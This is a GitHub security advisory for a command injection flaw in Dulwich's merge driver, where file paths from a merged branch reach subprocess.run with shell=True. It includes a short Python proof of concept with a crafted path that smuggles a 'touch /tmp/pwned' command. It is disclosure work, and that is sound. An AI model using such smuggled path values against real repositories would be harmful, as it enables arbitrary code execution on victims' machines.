# [H] Dulwich Vulnerable to Command Injection via Merge Driver Path

## Summary
Severity: High
Advisory: GHSA-9277-mp7x-85jf
CVE: CVE-2026-42563
CWE: CWE-78
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-28
Source: https://github.com/advisories/GHSA-9277-mp7x-85jf
Type: github-advisory

## Affected
- PyPI: `dulwich` — affected >=0.24.0 <1.2.5

## Details
## Summary

Dulwich's `ProcessMergeDriver` substitutes the file path (from the git tree, controllable by an attacker via a malicious branch) into the merge driver command via the `%P` placeholder and executes it with `subprocess.run(..., shell=True)`. An attacker who can cause a victim to merge an untrusted branch can achieve arbitrary command execution by crafting malicious file paths.

## Description

- **Type:** Command Injection
- **Source:** `merge.py` line 195 — path from merge tree (from repository content when merging untrusted branch)
- **Sink:** `merge_drivers.py` lines 124–127 — `subprocess.run(cmd, shell=True)` where `cmd` includes path via `%P` placeholder
- **Impact:** Arbitrary code execution when merging from a malicious repository. Requires the user to have a merge driver configured that uses the `%P` placeholder.

## Resources

- Repository: https://github.com/dulwich/dulwich
- Vulnerable file: `dulwich/merge_drivers.py` (lines 119–129)

## Proof of Concept

```python
from dulwich.attrs import GitAttributes, Pattern
from dulwich.config import ConfigDict
from dulwich.merge import merge_blobs
from dulwich.objects import Blob

# Merge driver with %P (path) - typical for custom merge tools
config = ConfigDict()
config.set((b"merge", b"injectable"), b"driver", b"echo %P > %A")

patterns = [(Pattern(b"*"), {b"merge": b"injectable"})]
gitattributes = GitAttributes(patterns)

base = Blob.from_string(b"base")
ours = Blob.from_string(b"ours")
theirs = Blob.from_string(b"theirs")

# Malicious path from attacker-controlled git tree: injects "touch /tmp/pwned"
malicious_path = b"x; touch /tmp/pwned #"

merge_blobs(base, ours, theirs, path=malicious_path,
            gitattributes=gitattributes, config=config)
# => Executes: echo x; touch /tmp/pwned #
# => Shell runs: echo x, then touch /tmp/pwned
```

## Fix
[merge_drivers_shell_escape.patch](https://github.com/user-attachments/files/27016503/merge_drivers_shell_escape.patch)

## References
- https://github.com/jelmer/dulwich/security/advisories/GHSA-9277-mp7x-85jf
- https://nvd.nist.gov/vuln/detail/CVE-2026-42563
- https://github.com/jelmer/dulwich/commit/e3331b3b3a122fc313460182f928f59723580b7b
- https://github.com/jelmer/dulwich
- https://github.com/jelmer/dulwich/releases/tag/dulwich-1.2.5
